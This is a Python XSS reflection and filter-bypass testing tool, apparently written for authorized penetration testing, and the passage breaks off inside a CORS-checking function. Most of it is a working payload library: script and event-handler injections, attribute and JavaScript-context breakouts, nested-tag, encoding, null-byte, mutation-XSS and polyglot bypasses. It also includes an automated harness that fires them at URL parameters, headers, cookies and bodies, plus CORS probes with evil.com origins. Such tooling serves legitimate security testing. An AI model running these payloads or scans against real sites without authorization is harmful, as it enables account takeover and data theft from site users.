#!/usr/bin/env python3
"""
XSS Reflection & Bypass Tester

Single-file harness for probing reflected XSS, content-type sniffing, and
input-filter bypass conditions on web endpoints. Built for authorized
internal security testing.

Workflow:
  1. Capture a baseline request from the target (Burp, browser devtools, curl -v).
  2. Mark each value you want fuzzed with the literal token §INJECT§
     (Burp-style). It may appear in the URL, any header value, or the body.
  3. Run this script. It substitutes a battery of payloads, sends each variant
     under multiple Accept headers, and analyzes responses for reflection,
     weak content-type handling, missing security headers, and the rendering
     context of the reflected token.
  4. Read the console summary and the JSON report.

Usage:
  # from a raw HTTP request file (paste a Burp Repeater request, mark §INJECT§)
  python xss_bypass_tester.py --raw req.txt --output report.json

  # inline args
  python xss_bypass_tester.py \\
      -u "https://target/api/x" \\
      -X POST \\
      -H "Cookie: token=§INJECT§" \\
      -H "Content-Type: application/json" \\
      -b '{"comment":null}' \\
      --output report.json

  # dry run — print what would be sent without firing
  python xss_bypass_tester.py --raw req.txt --dry-run

  # limit to specific payload categories
  python xss_bypass_tester.py --raw req.txt --categories attr_breakout polyglot

Authorized testing only. Do not use against systems you do not own or do not
have written permission to test.
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("Install dependencies: pip install requests", file=sys.stderr)
    sys.exit(1)


# ----------------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------------

INJECT_MARKER = "§INJECT§"  # §INJECT§

# Embedded inside every payload so we can detect reflection independent of the
# payload's outer punctuation (which the app may rewrite).
REFLECT_TOKEN = "Zq8K3xRq"

ACCEPT_VARIANTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html",
    "application/json, text/plain, */*",
    "*/*",
    "text/plain",
    "application/xml",
]

DEFAULT_TIMEOUT = 15
DEFAULT_RATE_LIMIT = 0.5
DEFAULT_WORKERS = 1

# Auto-mode injection surface
COMMON_PARAM_NAMES = [
    "q", "search", "s", "query", "keyword", "term",
    "id", "name", "user", "username", "email",
    "page", "view", "tab", "section",
    "redirect", "url", "next", "return", "returnUrl", "returnTo",
    "callback", "jsonp", "cb",
    "lang", "locale",
    "file", "path", "dir", "src", "dest",
    "ref", "referrer", "from",
    "data", "text", "msg", "message", "comment",
    "error", "err", "info", "warning",
    "input", "value", "v",
    "title", "desc", "description",
]

COMMON_HEADERS_TO_TEST = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Real-IP",
    "X-Forwarded-Proto",
    "X-Host",
    "X-Custom-Header",
    "X-Api-Version",
]

# In auto mode we trim the Accept fan-out to keep request volume sane.
AUTO_ACCEPT_VARIANTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html",
    "*/*",
]


# ----------------------------------------------------------------------------
# Payload library
#
# Every payload embeds REFLECT_TOKEN so the analyzer can find reflections even
# when the surrounding punctuation is filtered or rewritten.
# ----------------------------------------------------------------------------

def _t() -> str:
    return REFLECT_TOKEN


PAYLOADS: dict[str, list[str]] = {
    "html_tag_basic": [
        f"<script>alert('{_t()}')</script>",
        f"<script>alert(\"{_t()}\")</script>",
        f"<svg onload=alert('{_t()}')>",
        f"<svg/onload=alert('{_t()}')>",
        f"<img src=x onerror=alert('{_t()}')>",
        f"<img src=x onerror=\"alert('{_t()}')\">",
        f"<iframe src=javascript:alert('{_t()}')>",
        f"<iframe srcdoc=\"<script>alert('{_t()}')</script>\">",
        f"<body onload=alert('{_t()}')>",
        f"<details open ontoggle=alert('{_t()}')>",
        f"<marquee onstart=alert('{_t()}')>x</marquee>",
        f"<video><source onerror=alert('{_t()}')>",
        f"<audio src=x onerror=alert('{_t()}')>",
        f"<input autofocus onfocus=alert('{_t()}')>",
        f"<select autofocus onfocus=alert('{_t()}')><option>x</option></select>",
        f"<textarea autofocus onfocus=alert('{_t()}')>",
        f"<keygen autofocus onfocus=alert('{_t()}')>",
        f"<a href=\"javascript:alert('{_t()}')\">x</a>",
        f"<object data=\"javascript:alert('{_t()}')\">",
        f"<embed src=\"javascript:alert('{_t()}')\">",
        f"<form action=\"javascript:alert('{_t()}')\"><input type=submit>",
        (
            "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\""
            f"</textarea><img src onerror=alert('{_t()}')>\">"
        ),
    ],
    "attr_breakout": [
        f"\"><script>alert('{_t()}')</script>",
        f"'><script>alert('{_t()}')</script>",
        f"\"><img src=x onerror=alert('{_t()}')>",
        f"\"><svg onload=alert('{_t()}')>",
        f"\" autofocus onfocus=alert('{_t()}') x=\"",
        f"' autofocus onfocus=alert('{_t()}') x='",
        f"\" onmouseover=alert('{_t()}') x=\"",
        f"javascript:alert('{_t()}')",
        f"\"><iframe srcdoc=\"<script>alert('{_t()}')</script>\">",
        f"\"></title><script>alert('{_t()}')</script>",
        f"\"></textarea><script>alert('{_t()}')</script>",
    ],
    "js_context_breakout": [
        f"';alert('{_t()}');//",
        f"\";alert('{_t()}');//",
        f"</script><script>alert('{_t()}')</script>",
        f"`;alert('{_t()}');//",
        f"`-alert('{_t()}')-`",
        f"${{alert('{_t()}')}}",
        f"#{{alert('{_t()}')}}",
        f"-alert('{_t()}')-",
        f"*/alert('{_t()}')/*",
        f"\\';alert('{_t()}');//",
    ],
    "case_variation": [
        f"<ScRiPt>alert('{_t()}')</ScRiPt>",
        f"<SCRIPT>alert('{_t()}')</SCRIPT>",
        f"<IMG SrC=x OnErRoR=alert('{_t()}')>",
        f"<SvG OnLoAd=alert('{_t()}')>",
        f"<Script>alert('{_t()}')</Script>",
    ],
    "url_encoded": [
        urllib.parse.quote(f"<script>alert('{_t()}')</script>"),
        urllib.parse.quote(urllib.parse.quote(f"<script>alert('{_t()}')</script>")),
        urllib.parse.quote(f"<svg onload=alert('{_t()}')>"),
        urllib.parse.quote(f"<img src=x onerror=alert('{_t()}')>"),
        # Mixed: tag only encoded
        f"%3Cscript%3Ealert('{_t()}')%3C/script%3E",
        f"%3cscript%3ealert('{_t()}')%3c/script%3e",
    ],
    "html_entity": [
        f"&lt;script&gt;alert('{_t()}')&lt;/script&gt;",
        f"&#60;script&#62;alert('{_t()}')&#60;/script&#62;",
        f"&#x3c;script&#x3e;alert('{_t()}')&#x3c;/script&#x3e;",
        f"&#X3C;script&#X3E;alert('{_t()}')&#X3C;/script&#X3E;",
        f"&lt;img src=x onerror=alert('{_t()}')&gt;",
        # Long-form numeric (no semicolon — some parsers still accept)
        f"&#0000060;script&#0000062;alert('{_t()}')&#0000060;/script&#0000062;",
    ],
    "unicode_escape": [
        f"\\u003cscript\\u003ealert('{_t()}')\\u003c/script\\u003e",
        f"\\x3cscript\\x3ealert('{_t()}')\\x3c/script\\x3e",
        # Real unicode chars (some sanitizers normalize, some don't)
        f"<script>alert('{_t()}')</script>",
    ],
    "whitespace_evasion": [
        f"<script\t>alert('{_t()}')</script>",
        f"<script\n>alert('{_t()}')</script>",
        f"<script\r>alert('{_t()}')</script>",
        f"<script/x>alert('{_t()}')</script>",
        f"<img\tsrc=x\tonerror=alert('{_t()}')>",
        f"<svg‌onload=alert('{_t()}')>",  # ZWNJ
        f"<svg/onload=alert('{_t()}')//",
        f"<img src=x onerror= alert('{_t()}') >",
    ],
    "nested_filter_bypass": [
        # Defeat naive single-pass strip-tag filters
        f"<scr<script>ipt>alert('{_t()}')</scr</script>ipt>",
        f"<<script>alert('{_t()}')//<</script>",
        f"<scrip<script>t>alert('{_t()}')</scrip</script>t>",
        f"<img src=x oneonerrorrror=alert('{_t()}')>",
        f"<img src=\"x\" onerror=\"alert('{_t()}')\"<!--",
    ],
    "no_paren": [
        f"<script>onerror=alert;throw'{_t()}'</script>",
        f"<svg onload=alert`{_t()}`>",
        f"<svg><script>alert&#40;'{_t()}'&#41;</script>",
        f"<script>{{onerror=alert}}throw'{_t()}'</script>",
    ],
    "data_uri": [
        f"data:text/html,<script>alert('{_t()}')</script>",
        (
            "data:text/html;base64,"
            + base64.b64encode(f"<script>alert('{_t()}')</script>".encode()).decode()
        ),
        f"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{_t()}')/>",
    ],
    "mutation_xss": [
        # mXSS — payload that's inert as parsed text but becomes live when
        # the application re-serializes via innerHTML.
        f"<noscript><p title=\"</noscript><img src=x onerror=alert('{_t()}')>\">",
        f"<listing>&lt;img src=x onerror=alert('{_t()}')&gt;</listing>",
        f"<noembed>&lt;img src=x onerror=alert('{_t()}')&gt;</noembed>",
        f"<style><img src=x onerror=alert('{_t()}')></style>",
        f"<template><img src=x onerror=alert('{_t()}')></template>",
    ],
    "polyglot": [
        # Ortiz' classic polyglot — works across many contexts.
        (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('" + _t() + "') )"
            "//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
            "\\x3csVg/<sVg/oNloAd=alert('" + _t() + "')//>\\x3e"
        ),
        f"\";alert('{_t()}');//<svg onload=alert('{_t()}')>--></script><svg onload=alert('{_t()}')>",
        f"'\"--></style></script><svg onload=alert('{_t()}')>",
    ],
    "css_context": [
        f"</style><script>alert('{_t()}')</script>",
        f"expression(alert('{_t()}'))",
        f"x:expression(alert('{_t()}'))",
        f"</style><svg onload=alert('{_t()}')>",
    ],
    "null_byte": [
        f"<script>alert('{_t()}')</script>\x00",
        f"<scri\x00pt>alert('{_t()}')</scri\x00pt>",
        f"<img src=x\x00onerror=alert('{_t()}')>",
    ],
    "control_char": [
        f"<img src=x onerror\x09=alert('{_t()}')>",
        f"<img src=x onerror\x0a=alert('{_t()}')>",
        f"<img src=x onerror\x0c=alert('{_t()}')>",
        f"<img src=x onerror\x0d=alert('{_t()}')>",
    ],
    "double_encoded": [
        # The token alone, URL-double-encoded — flags WAFs that decode once
        # then forward decoded payloads to the backend.
        urllib.parse.quote(urllib.parse.quote(f"<svg onload=alert('{_t()}')>")),
        urllib.parse.quote(urllib.parse.quote(f"<img src=x onerror=alert('{_t()}')>")),
    ],
    "passive_marker": [
        # Inert reflection probe — the token by itself. Use to confirm a
        # parameter is reflected before judging which active payloads fired.
        _t(),
    ],
}


# ----------------------------------------------------------------------------
# Raw request parsing (Burp Repeater format)
# ----------------------------------------------------------------------------

def parse_raw_request(
    raw: str,
    scheme: str = "https",
    host_override: str | None = None,
) -> dict[str, Any]:
    lines = raw.replace("\r\n", "\n").split("\n")
    if not lines:
        raise ValueError("Empty request")

    parts = lines[0].split(" ", 2)
    if len(parts) < 2:
        raise ValueError(f"Bad request line: {lines[0]}")
    method = parts[0].upper()
    path = parts[1]

    headers: dict[str, str] = {}
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1

    body = "\n".join(lines[i + 1:]) if i + 1 < len(lines) else ""
    body = body.rstrip("\n")

    host = host_override or headers.get("Host", "")
    if not host:
        raise ValueError("Missing Host header and no --host override")
    if path.startswith("http"):
        url = path
    else:
        url = f"{scheme}://{host}{path}"

    return {"method": method, "url": url, "headers": headers, "body": body}


# ----------------------------------------------------------------------------
# Injection
# ----------------------------------------------------------------------------

def find_injection_points(req: dict[str, Any]) -> list[tuple[str, str]]:
    points: list[tuple[str, str]] = []
    if INJECT_MARKER in req["url"]:
        points.append(("url", req["url"]))
    for k, v in req["headers"].items():
        if INJECT_MARKER in v:
            points.append((f"header:{k}", v))
    if INJECT_MARKER in req["body"]:
        points.append(("body", req["body"]))
    return points


def apply_payload(req: dict[str, Any], payload: str) -> dict[str, Any]:
    return {
        "method": req["method"],
        "url": req["url"].replace(INJECT_MARKER, payload),
        "headers": {k: v.replace(INJECT_MARKER, payload) for k, v in req["headers"].items()},
        "body": req["body"].replace(INJECT_MARKER, payload),
    }


# ----------------------------------------------------------------------------
# Response analysis
# ----------------------------------------------------------------------------

SECURITY_HEADERS = [
    "content-type",
    "content-security-policy",
    "x-content-type-options",
    "x-frame-options",
    "x-xss-protection",
    "referrer-policy",
    "strict-transport-security",
]


def classify_context(text: str, token: str) -> str:
    idx = text.find(token)
    if idx < 0:
        return "none"

    snippet = text[max(0, idx - 200):idx]

    last_script_open = snippet.rfind("<script")
    last_script_close = snippet.rfind("</script")
    if last_script_open > last_script_close:
        return "js_block"

    last_style_open = snippet.rfind("<style")
    last_style_close = snippet.rfind("</style")
    if last_style_open > last_style_close:
        return "css_block"

    last_comment_open = snippet.rfind("<!--")
    last_comment_close = snippet.rfind("-->")
    if last_comment_open > last_comment_close:
        return "html_comment"

    last_tag_open = snippet.rfind("<")
    last_tag_close = snippet.rfind(">")
    if last_tag_open > last_tag_close:
        tag_snippet = snippet[last_tag_open:]
        if "=" in tag_snippet:
            tail = tag_snippet[tag_snippet.rfind("="):]
            if "\"" in tail:
                return "html_attribute_double"
            if "'" in tail:
                return "html_attribute_single"
            return "html_attribute_unquoted"
        return "html_tag_name"

    return "html_body"


def analyze_response(resp: requests.Response, payload: str) -> dict[str, Any]:
    text = resp.text
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}

    reflections: list[str] = []
    if REFLECT_TOKEN in text:
        reflections.append("literal_token")
    if html.escape(REFLECT_TOKEN) in text and html.escape(REFLECT_TOKEN) != REFLECT_TOKEN:
        reflections.append("html_escaped_token")
    if payload in text:
        reflections.append("full_payload_literal")
    if urllib.parse.quote(REFLECT_TOKEN) in text:
        reflections.append("url_encoded_token")

    surrounding: list[str] = []
    for m in re.finditer(re.escape(REFLECT_TOKEN), text):
        start = max(0, m.start() - 80)
        end = min(len(text), m.end() + 80)
        surrounding.append(text[start:end])

    context = classify_context(text, REFLECT_TOKEN)

    sec_headers = {h: headers_lower.get(h) for h in SECURITY_HEADERS}
    content_type = headers_lower.get("content-type", "<missing>")
    is_html = "text/html" in content_type.lower()
    has_nosniff = "nosniff" in headers_lower.get("x-content-type-options", "").lower()
    has_csp = bool(headers_lower.get("content-security-policy"))

    score = 0
    if reflections:
        score += 30
    if "literal_token" in reflections:
        score += 20
    if "full_payload_literal" in reflections:
        score += 30
    if is_html and reflections:
        score += 40
    if reflections and not has_csp:
        score += 10
    if reflections and not has_nosniff and content_type == "<missing>":
        score += 15
    if context in ("html_body", "html_attribute_double", "html_attribute_single",
                   "html_attribute_unquoted", "js_block"):
        score += 20

    return {
        "status": resp.status_code,
        "content_type": content_type,
        "is_html": is_html,
        "has_nosniff": has_nosniff,
        "has_csp": has_csp,
        "security_headers": sec_headers,
        "reflections": reflections,
        "surrounding": surrounding[:3],
        "context": context,
        "score": score,
        "body_length": len(text),
    }


# ----------------------------------------------------------------------------
# Auto-discovery — generate candidate injection vectors and probe for reflection
# ----------------------------------------------------------------------------

def _replace_url(req: dict[str, Any], new_url: str) -> dict[str, Any]:
    return {**req, "url": new_url, "headers": dict(req["headers"])}


def _with_header(req: dict[str, Any], name: str, value: str) -> dict[str, Any]:
    h = dict(req["headers"])
    h[name] = value
    return {**req, "headers": h}


def auto_expand(base_req: dict[str, Any], auth_cookie: str | None) -> list[tuple[str, dict[str, Any]]]:
    """Return list of (label, req_with_marker_placed) for every candidate
    injection point — existing query params, common test params, path,
    common headers, and cookies."""
    vectors: list[tuple[str, dict[str, Any]]] = []
    parsed = urllib.parse.urlparse(base_req["url"])
    existing_params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

    headers = dict(base_req["headers"])
    headers.setdefault(
        "User-Agent",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0 XSS-Bypass-Tester",
    )
    if auth_cookie:
        existing_cookie = headers.get("Cookie", "")
        headers["Cookie"] = (existing_cookie + "; " + auth_cookie).strip("; ") if existing_cookie else auth_cookie
    req_base = {**base_req, "headers": headers}

    # 1. Existing query params — inject one at a time
    existing_names = {k for k, _ in existing_params}
    for i, (k, _v) in enumerate(existing_params):
        new_params = list(existing_params)
        new_params[i] = (k, INJECT_MARKER)
        new_query = urllib.parse.urlencode(new_params, safe="")
        vectors.append((f"query:{k}", _replace_url(req_base, parsed._replace(query=new_query).geturl())))

    # 2. Common test params
    for name in COMMON_PARAM_NAMES:
        if name in existing_names:
            continue
        new_params = list(existing_params) + [(name, INJECT_MARKER)]
        new_query = urllib.parse.urlencode(new_params, safe="")
        vectors.append((f"query:+{name}", _replace_url(req_base, parsed._replace(query=new_query).geturl())))

    # 3. Path segments
    path = parsed.path or "/"
    path_no_slash = path.rstrip("/")
    if path_no_slash and path_no_slash != "":
        segs = path_no_slash.split("/")
        # Replace last segment
        new_segs = segs[:-1] + [INJECT_MARKER]
        new_path = "/".join(new_segs)
        vectors.append((
            "path:last_segment",
            _replace_url(req_base, parsed._replace(path=new_path).geturl()),
        ))
    # Append a new segment
    sep = "" if path.endswith("/") else "/"
    new_path = path + sep + INJECT_MARKER
    vectors.append((
        "path:appended",
        _replace_url(req_base, parsed._replace(path=new_path).geturl()),
    ))

    # 4. Common headers
    for h in COMMON_HEADERS_TO_TEST:
        vectors.append((f"header:{h}", _with_header(req_base, h, INJECT_MARKER)))

    # 5. Cookies — if the user provided auth cookies, inject into each named
    #    value too; otherwise add a generic probe cookie.
    cookie_header = headers.get("Cookie", "")
    if cookie_header:
        parts = [p.strip() for p in cookie_header.split(";") if p.strip()]
        for i, p in enumerate(parts):
            if "=" in p:
                name = p.split("=", 1)[0].strip()
                new_parts = list(parts)
                new_parts[i] = f"{name}={INJECT_MARKER}"
                vectors.append((f"cookie:{name}", _with_header(req_base, "Cookie", "; ".join(new_parts))))
    else:
        vectors.append(("cookie:probe", _with_header(req_base, "Cookie", f"probe={INJECT_MARKER}")))

    # 6. Body injection if request has a body — try replacing the body value
    if base_req["body"]:
        try:
            parsed_body = json.loads(base_req["body"])
            if isinstance(parsed_body, dict):
                for k in list(parsed_body.keys()):
                    new_body = dict(parsed_body)
                    new_body[k] = INJECT_MARKER
                    vectors.append((
                        f"body:json:{k}",
                        {**req_base, "body": json.dumps(new_body)},
                    ))
        except (json.JSONDecodeError, ValueError):
            # Form-encoded?
            if "=" in base_req["body"] and "&" in base_req["body"]:
                form_pairs = urllib.parse.parse_qsl(base_req["body"], keep_blank_values=True)
                for i, (k, _) in enumerate(form_pairs):
                    new_pairs = list(form_pairs)
                    new_pairs[i] = (k, INJECT_MARKER)
                    vectors.append((
                        f"body:form:{k}",
                        {**req_base, "body": urllib.parse.urlencode(new_pairs, safe="")},
                    ))

    return vectors


class FatalProbeError(RuntimeError):
    """Raised to bail out of probe phase early when every request will fail
    the same way (e.g. TLS cert verification, name resolution)."""


def _looks_like_cert_error(exc: Exception) -> bool:
    msg = str(exc).lower()
    return any(s in msg for s in (
        "certificate verify failed",
        "ssl: certificate",
        "sslcertverificationerror",
        "self signed certificate",
        "self-signed certificate",
    ))


def _looks_like_dns_error(exc: Exception) -> bool:
    msg = str(exc).lower()
    return any(s in msg for s in (
        "name or service not known",
        "nodename nor servname",
        "getaddrinfo failed",
        "name resolution",
    ))


def discover_reflecting_vectors(
    session: requests.Session,
    vectors: list[tuple[str, dict[str, Any]]],
    timeout: int,
    rate_limit: float,
    max_vectors: int,
    progress: bool = True,
) -> list[dict[str, Any]]:
    """Probe each vector with REFLECT_TOKEN; return those whose response
    body contains the token (and so are reflection candidates)."""
    reflecting: list[dict[str, Any]] = []
    total = len(vectors)
    consecutive_errors = 0
    for idx, (label, req) in enumerate(vectors, 1):
        probed = apply_payload(req, REFLECT_TOKEN)
        try:
            resp = session.request(
                method=probed["method"],
                url=probed["url"],
                headers=probed["headers"],
                data=probed["body"].encode("utf-8", errors="replace") if probed["body"] else None,
                timeout=timeout,
                allow_redirects=False,
            )
            consecutive_errors = 0
            text = resp.text or ""
            ctype = resp.headers.get("Content-Type", "<missing>")
            reflected = REFLECT_TOKEN in text
            if progress:
                marker = "[+]" if reflected else "[ ]"
                print(f"{marker} probe {idx}/{total} {label:30s} status={resp.status_code} ctype={ctype[:40]}",
                      file=sys.stderr)
            if reflected:
                reflecting.append({
                    "label": label,
                    "req": req,
                    "status": resp.status_code,
                    "content_type": ctype,
                })
        except requests.RequestException as e:
            consecutive_errors += 1
            # On the very first error, if it's a fatal class (TLS cert, DNS),
            # bail out rather than spam 60+ identical errors.
            if idx == 1 or consecutive_errors >= 3:
                if _looks_like_cert_error(e):
                    raise FatalProbeError(
                        "TLS certificate verification failed. The target's cert is not "
                        "trusted by your system's CA store.\n"
                        "    Re-run with --no-verify to skip TLS verification (typical for "
                        "internal/staging targets with self-signed or internal-CA certs)."
                    ) from e
                if _looks_like_dns_error(e):
                    raise FatalProbeError(
                        f"DNS resolution failed for the target host. Check the URL or "
                        f"your connection.\n    Error: {e}"
                    ) from e
            if progress:
                print(f"[!] probe {idx}/{total} {label}: {e}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(rate_limit)
    # Cap to most promising — prefer HTML content types
    reflecting.sort(key=lambda r: ("text/html" not in r["content_type"].lower(), r["label"]))
    return reflecting[:max_vectors]


DOM_SINKS = {
    "innerHTML": r"\.innerHTML\s*=",
    "outerHTML": r"\.outerHTML\s*=",
    "document.write": r"document\.write(?:ln)?\s*\(",
    "eval": r"\beval\s*\(",
    "setTimeout_string": r"setTimeout\s*\(\s*[\"']",
    "setInterval_string": r"setInterval\s*\(\s*[\"']",
    "Function_constructor": r"\bnew\s+Function\s*\(",
    "insertAdjacentHTML": r"\.insertAdjacentHTML\s*\(",
    "location_assign": r"location\s*\.\s*(?:href|replace|assign)\s*=",
    "jQuery_html": r"\$\([^)]*\)\.html\s*\(",
    "jQuery_append": r"\$\([^)]*\)\.append\s*\(",
}

DOM_SOURCES = {
    "location.hash": r"location\s*\.\s*hash",
    "location.search": r"location\s*\.\s*search",
    "location.href": r"location\s*\.\s*href",
    "document.URL": r"document\s*\.\s*URL",
    "document.referrer": r"document\s*\.\s*referrer",
    "document.cookie": r"document\s*\.\s*cookie",
    "window.name": r"window\s*\.\s*name",
    "postMessage": r"addEventListener\s*\(\s*[\"']message[\"']",
}


def static_dom_scan(session: requests.Session, url: str, timeout: int) -> dict[str, Any]:
    """Fetch URL, scan the response body for DOM XSS sinks/sources patterns."""
    try:
        resp = session.get(url, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        if _looks_like_cert_error(e):
            raise FatalProbeError(
                "TLS certificate verification failed on baseline fetch. "
                "Re-run with --no-verify to skip TLS verification."
            ) from e
        if _looks_like_dns_error(e):
            raise FatalProbeError(
                f"DNS resolution failed on baseline fetch.\n    Error: {e}"
            ) from e
        return {"error": str(e)}
    body = resp.text or ""
    sinks_found: dict[str, int] = {}
    for name, pattern in DOM_SINKS.items():
        m = re.findall(pattern, body, re.IGNORECASE)
        if m:
            sinks_found[name] = len(m)
    sources_found: dict[str, int] = {}
    for name, pattern in DOM_SOURCES.items():
        m = re.findall(pattern, body, re.IGNORECASE)
        if m:
            sources_found[name] = len(m)
    return {
        "url": url,
        "status": resp.status_code,
        "content_type": resp.headers.get("Content-Type", "<missing>"),
        "body_length": len(body),
        "sinks_found": sinks_found,
        "sources_found": sources_found,
        "potential_dom_xss": bool(sinks_found and sources_found),
    }


# ----------------------------------------------------------------------------
# Vulnerability modules — each function takes (session, base_req, args) and
# returns a list of Finding objects. All modules guard their own requests; one
# failing module never aborts the run.
# ----------------------------------------------------------------------------

SEVERITY_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


@dataclass
class Finding:
    module: str
    severity: str
    title: str
    detail: str
    evidence: dict[str, Any] = field(default_factory=dict)


def _safe_get(session: requests.Session, url: str, headers: dict[str, str], timeout: int,
              method: str = "GET", data: Any = None) -> requests.Response | None:
    try:
        return session.request(method=method, url=url, headers=headers,
                               data=data, timeout=timeout, allow_redirects=False)
    except requests.RequestException:
        return None


def mod_security_headers(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
    if resp is None:
        return []
    findings: list[Finding] = []
    h = {k.lower(): v for k, v in resp.headers.items()}

    is_https = base_req["url"].lower().startswith("https://")
    checks: list[tuple[str, str, str, str]] = [
        ("content-security-policy", "high", "Missing Content-Security-Policy",
         "No CSP header — XSS mitigations rely entirely on output encoding. Any reflection becomes high impact."),
        ("x-frame-options", "medium", "Missing X-Frame-Options",
         "Page can be framed → clickjacking risk if CSP frame-ancestors not set."),
        ("x-content-type-options", "medium", "Missing X-Content-Type-Options",
         "MIME sniffing not blocked — type confusion attacks possible (XSS via JSON, etc.)."),
        ("referrer-policy", "low", "Missing Referrer-Policy",
         "Default policy may leak full URLs (with tokens) to third-party origins."),
        ("permissions-policy", "low", "Missing Permissions-Policy",
         "No restrictions on camera/microphone/geolocation/payment APIs."),
    ]
    if is_https:
        checks.append(("strict-transport-security", "medium", "Missing Strict-Transport-Security",
                       "HSTS not enforced — downgrade attacks possible on first visit."))

    for header, sev, title, detail in checks:
        if header not in h:
            findings.append(Finding("security_headers", sev, title, detail,
                                    evidence={"url": base_req["url"], "missing_header": header}))

    csp = h.get("content-security-policy", "")
    if csp:
        weak: list[str] = []
        if "'unsafe-inline'" in csp:
            weak.append("'unsafe-inline'")
        if "'unsafe-eval'" in csp:
            weak.append("'unsafe-eval'")
        if re.search(r"(?:^|\s)\*(?:\s|;|$)", csp):
            weak.append("wildcard source (*)")
        if "data:" in csp and "script-src" in csp.split(";")[0:]:
            for d in csp.split(";"):
                if "script-src" in d and "data:" in d:
                    weak.append("script-src with data:")
                    break
        if weak:
            findings.append(Finding("security_headers", "medium",
                                    f"Weak CSP directives: {', '.join(weak)}",
                                    "CSP present but contains weakening tokens.",
                                    evidence={"csp": csp[:500]}))

    hsts = h.get("strict-transport-security", "")
    if hsts:
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) < 31536000:
            findings.append(Finding("security_headers", "low",
                                    f"HSTS max-age short ({m.group(1)}s)",
                                    "max-age < 1 year — partial HSTS coverage.",
                                    evidence={"hsts": hsts}))
        if "includesubdomains" not in hsts.lower():
            findings.append(Finding("security_headers", "low",
                                    "HSTS missing includeSubDomains",
                                    "Subdomains not covered by HSTS.",
                                    evidence={"hsts": hsts}))

    xfo = h.get("x-frame-options", "")
    if xfo and xfo.upper() not in ("DENY", "SAMEORIGIN"):
        findings.append(Finding("security_headers", "low",
                                f"X-Frame-Options: {xfo} (non-standard)",
                                "Browsers ignore values other than DENY/SAMEORIGIN.",
                                evidence={"xfo": xfo}))
    return findings


def mod_cookie_security(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
    if resp is None:
        return []
    findings: list[Finding] = []
    set_cookies: list[str] = []
    try:
        raw = getattr(resp.raw, "headers", None)
        if raw is not None:
            for v in raw.get_all("Set-Cookie") or []:
                set_cookies.append(v)
    except Exception:
        pass
    if not set_cookies:
        v = resp.headers.get("Set-Cookie")
        if v:
            set_cookies = [v]

    is_https = base_req["url"].lower().startswith("https://")
    for cookie_str in set_cookies:
        name = cookie_str.split("=", 1)[0]
        lower = cookie_str.lower()
        issues: list[str] = []
        if "httponly" not in lower:
            issues.append("HttpOnly")
        if is_https and "secure" not in lower:
            issues.append("Secure")
        if "samesite" not in lower:
            issues.append("SameSite")
        if issues:
            findings.append(Finding("cookie_security", "medium",
                                    f"Cookie '{name}' missing flags: {', '.join(issues)}",
                                    "Missing flags increase XSS theft, MITM exposure, and CSRF risk.",
                                    evidence={"set_cookie": cookie_str[:300]}))
    return findings


def mod_server_info(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout)
    if resp is None:
        return []
    findings: list[Finding] = []
    for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
              "X-Runtime", "X-Generator", "X-Drupal-Cache", "X-Backend-Server", "Via"]:
        v = resp.headers.get(h)
        if v:
            findings.append(Finding("server_info", "info",
                                    f"{h}: {v}",
                                    "Server fingerprint disclosed — useful for targeted exploit selection.",
                                    evidence={h: v}))
    return findings


def mod_cors(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    target_netloc = urllib.parse.urlparse(base_req["url"]).netloc
    probes: list[tuple[str, str]] = [
        ("https://evil.com", "arbitrary origin"),
        ("null", "null origin"),
        (f"https://{target_netloc}.evil.com", "suffix bypass"),
        (f"https://evil{target_netloc}", "prefix bypass"),
        (f"https://{target_netloc.replace('.', 'x', 1)}", "char-replace bypass"),
    ]
    for origin, label in probes:
        h = dict(base_req["headers"])
        h["Origin"] = origin
        resp = _safe_get(session, base_req["url"], h, args.timeout)
        if resp is None:
            continue
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        if not acao:
            continue
        if acao == origin and acac.lower() == "true":
            findings.append(Finding("cors", "high",
                                    f"CORS: Origin reflection WITH credentials ({label})",
                                    f"Server returned ACAO={acao}, ACAC=true for arbitrary Origin. "
                                    "Attacker page can read authenticated responses.",
                                    evidence={"origin_sent": origin, "acao": acao, "acac": acac}))
        elif acao == "*" and acac.lower() == "true":
            findings.append(Finding("cors", "high",
                                    "CORS: wildcard ACAO with ACAC=true",
                                    "Invalid CORS config (browsers block this combination) — indicates intent and likely an exploitable path.",
                                    evidence={"acao": acao, "acac": acac}))
        elif acao == origin:
